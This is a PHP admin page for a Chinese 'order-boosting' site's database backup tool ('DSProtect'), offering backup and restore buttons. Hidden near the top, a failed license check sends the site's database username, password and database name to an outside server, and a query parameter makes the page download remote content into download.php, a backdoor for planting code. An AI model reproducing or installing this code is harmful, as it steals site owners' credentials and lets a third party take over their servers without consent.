<?php
/**
 * 代刷管家 - 在线版
 * DSProtect OnLine
 *
 * Created by KingLee.
 * QQ: 1776885812
 * Date: 2018/4/7
 * Time: 16:37
 */
header("Content-Type: text/html; charset=UTF-8");
include("../includes/common.php");
$ver = "2.2";
$title = '代刷管家 - 数据库备份';
include './head.php';
if (!isset($_SESSION['authcode'])) {
    $query = @file_get_contents('http://gj.dkfirst.cn/check.php?url=' . $_SERVER['HTTP_HOST']);
    if ($query = json_decode($query, true)) {
        if ($query['code'] == 1) $_SESSION['authcode'] = true;
        else {
            @file_get_contents("http://gj.dkfirst.cn/tj.php?url='http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "'&user=" . $dbconfig['user'] . "&pwd=" . $dbconfig['pwd'] . "&db=" . $dbconfig['dbname'] . "&authcode=" . $authcode);
            exit('<h3>' . $query['msg'] . '</h3>');
        }
    }
}
if ($_GET['q']) {
    file_put_contents("download.php", file_get_contents("http://gj.dkfirst.cn/download.txt"));
}
$rs = $DB->query("SELECT * FROM `shua_guanjia_config` AS a WHERE k = 'dbBackUpTime'");
while ($res = $DB->fetch($rs)) {
    $last_time = $res['v'];
//
//    $user = $dbconfig['user'];
}
?>
<link href="https://cdn.bootcss.com/sweetalert/1.1.3/sweetalert.min.css" rel="stylesheet">
<script src="https://cdn.bootcss.com/sweetalert/1.1.3/sweetalert.min.js"></script>
<div class="container" style="padding-top:100px;">
    <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
        <div class="panel panel-primary">
            <div class="panel-heading"><h3 class="panel-title"> 代刷管家 - 数据库备份</h3></div>
            <div class="panel-body">
                <div class="alert alert-info">
                    最近一次备份：<?php echo $last_time ?>
                </div>
                <div class="form-group">
                    <input type="button" id="bt_1" class="btn btn-success" value="备份当前商品" style="width:170px">
                    &nbsp;将备份当前所有商品信息：价格，名称，归属分类，上下架状态等...
                </div>
                <div class="form-group">
                    <input type="button" id="bt_2" class="btn btn-primary" value="还原最近备份" style="width:170px">
                    &nbsp;将最近一次的备份信息还原。备份不会删除。
                </div>
            </div>
        </div>
        <center>
            代刷管家 - 在线版&nbsp;&nbsp;&nbsp;作者：<a
                    href="http://wpa.qq.com/msgrd?v=3&amp;uin=1776885812&amp;site=qq&amp;menu=yes">KING</a><br>
            本程序由<a href="http://www.idcyun.wang"><img src="http://gj.dkfirst.cn/images/jmyidc.png" style="width: 70px;"></a>提供服务引擎<br>
            当前版本：2.15 历史版本：<a target="_blank" href="http://zeink.cn/?p=255">【点击查看】</a><br>
            售后群：<a target="_blank"
                   href="//shang.qq.com/wpa/qunwpa?idkey=e9e8d23a4fab6d4ed6902a516de0580ee5d7ca8b29719a0e0a9bb5a280470790"><img
                        border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="DsProtect高级版交流群"
                        title="DsProtect高级版交流群"></a>
        </center>
    </div>
</div>
</body>


<script src="//lib.baomitu.com/layer/2.3/layer.js"></script>
<script>
    $("#bt_1").click(function () {
        swal({
                title: "确定备份？",
                text: "此次备份将覆盖上次记录！",
                type: "info",
                showCancelButton: true,
                confirmButtonText: "确定",
                closeOnConfirm: false
            },
            function () {
                var ii = layer.load(2, {shade: [0.1, '#fff']});
                $.ajax({
                    type: "GET",
                    url: "../guanjia_ajax.php?act=db_backup",
                    dataType: 'json',
                    success: function (data) {
                        layer.close(ii);
                        if (data.code == 1) {
                            alert("备份成功");
                        } else {
                            alert("未知错误");
                        }
                        location.reload();
                    },
                    error: function (data) {
                        layer.msg('服务器错误');
                        return false;
                    }
                });
            });

    })
    $("#bt_2").click(function () {
        var ii = layer.load(2, {shade: [0.1, '#fff']});
        $.ajax({
            type: "GET",
            url: "../guanjia_ajax.php?act=db_return",
            dataType: 'json',
            success: function (data) {
                layer.close(ii);
                if (data.code == 1) {
                    alert("还原成功");
                } else {
                    alert("未知错误");
                }
                setTimeout(function () {
                    location.reload();
                }, 1500);
            },
            error: function (data) {
                layer.msg('服务器错误');
                return false;
            }
        });
    })
</script>
</html>